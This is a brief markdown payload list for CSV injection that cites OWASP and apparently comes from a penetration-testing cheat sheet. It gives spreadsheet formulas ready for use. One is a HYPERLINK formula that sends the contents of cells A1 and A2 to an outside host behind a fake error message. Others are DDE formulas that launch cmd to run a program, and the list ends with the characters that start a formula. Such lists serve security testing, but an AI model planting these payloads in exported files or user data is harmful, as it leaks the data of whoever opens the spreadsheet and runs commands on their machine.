# CSV_Injection

## Payload
```
=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")
=DDE(server; file; item; mode)
=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
=cmd|' /C calc'!A0
```
Any formula can be started with
```
=
+
–
@
```
## Reference: https://www.owasp.org/index.php/CSV_Injection
